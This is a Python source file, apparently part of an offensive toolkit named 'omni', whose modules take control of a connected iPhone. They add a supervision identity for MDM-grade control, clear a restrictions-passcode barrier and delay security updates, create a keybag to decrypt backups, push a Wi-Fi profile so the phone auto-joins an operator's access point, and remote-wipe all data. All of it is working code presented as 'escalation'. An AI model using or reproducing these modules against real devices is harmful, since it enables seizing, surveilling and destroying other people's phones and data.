"""iOS escalation: supervision, restriction removal and remote-wipe.

The moves that change who controls the device:

* ``ios.supervise`` — add a supervision identity so the host can push MDM-grade
  profiles, bypassing the "profile already installed" wall.
* ``ios.restrictions`` — clear an existing restrictions passcode barrier by
  installing a fresh restrictions profile.
* ``ios.erase`` — remote wipe; the phone starts up like a new one.
"""

from __future__ import annotations

import os

from omni.core import config, console
from omni.core.module import Option
from omni.ios.modules._base import IosModule

__all__ = ["Supervise", "Restrictions", "Keybag", "WifiProfile", "Erase"]


class Supervise(IosModule):
    NAME = "ios.supervise"
    DESCRIPTION = "Supervise the device (gives MDM-grade control over it)"
    NEEDS = ("pymobiledevice3",)
    OPTIONS = (Option("UDID", "target UDID"),
               Option("ORG", "organization name shown on the device",
                      "OMNI", required=True),
               Option("KEYBAG", "keybag for the supervision record"))

    def execute(self) -> dict:
        client = self.client()
        args = ["profile", "supervise", self.get("ORG")]
        if self.get("KEYBAG"):
            args += ["--keybag", os.path.expanduser(self.get("KEYBAG"))]
        client.check(*args, timeout=300)
        console.ok("device supervised — cloud config and MDM profiles now apply")
        return {"supervised": True, "organization": self.get("ORG")}


class Restrictions(IosModule):
    NAME = "ios.restrictions"
    DESCRIPTION = "Install a restrictions profile (also used to delay OTA updates)"
    NEEDS = ("pymobiledevice3",)
    OPTIONS = (Option("UDID", "target UDID"),
               Option("KEYBAG", "keybag for the profile"),
               Option("OTADELAY", "enforced software-update delay, days 0-90",
                      "0"))

    def execute(self) -> dict:
        client = self.client()
        args = ["profile", "install-restrictions-profile"]
        if self.get("KEYBAG"):
            args += ["--keybag", os.path.expanduser(self.get("KEYBAG"))]
        delay = max(0, min(90, self.get_int("OTADELAY", 0)))
        if delay:
            args += ["--enforced-software-update-delay", str(delay)]
        client.check(*args, timeout=300)
        console.ok("restrictions profile installed"
                   + (f" with a {delay}d OTA delay" if delay else ""))
        return {"otadelay": delay}


class Keybag(IosModule):
    NAME = "ios.keybag"
    DESCRIPTION = "Create a keybag so backup contents stay decryptable"
    NEEDS = ("pymobiledevice3",)
    OPTIONS = (Option("UDID", "target UDID"),
               Option("OUT", "keybag path"))

    def execute(self) -> dict:
        client = self.client()
        path = os.path.expanduser(
            self.get("OUT") or os.path.join(config.output_dir("ios"),
                                            "keybag.plist"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        client.check("profile", "create-keybag", path, timeout=300)
        console.ok(f"keybag -> {path} (needed to read an encrypted backup)")
        return {"path": path}


class WifiProfile(IosModule):
    NAME = "ios.wifi_profile"
    DESCRIPTION = "Push a Wi-Fi profile so the device auto-joins your AP"
    NEEDS = ("pymobiledevice3",)
    OPTIONS = (Option("UDID", "target UDID"),
               Option("SSID", "network name", "", required=True),
               Option("PASSWORD", "PSK (blank = open network)"),
               Option("ENCRYPTION", "WPA|WPA2|WPA3|NONE", "WPA2",
                      choices=("WPA", "WPA2", "WPA3", "NONE")))

    def execute(self) -> dict:
        client = self.client()
        client.check("profile", "install-wifi-profile", self.get("ENCRYPTION"),
                     self.get("SSID"), self.get("PASSWORD") or "", timeout=300)
        console.ok(f"Wi-Fi profile pushed for {self.get('SSID')} — the device "
                   f"will auto-join it")
        return {"ssid": self.get("SSID"), "encryption": self.get("ENCRYPTION")}


class Erase(IosModule):
    NAME = "ios.erase"
    DESCRIPTION = "Remote-wipe the device (DESTRUCTIVE)"
    NEEDS = ("pymobiledevice3",)
    OPTIONS = (Option("UDID", "target UDID"),
               Option("KEEP_ESIM", "preserve the eSIM/data plan", "true",
                      choices=("true", "false")))

    def execute(self) -> dict:
        client = self.client()
        args = ["profile", "erase-device"]
        if self.get_bool("KEEP_ESIM", True):
            args += ["--preserve-data-plan"]
        client.check(*args, timeout=3600)
        console.ok("device erased — all local data gone")
        return {"erased": True}
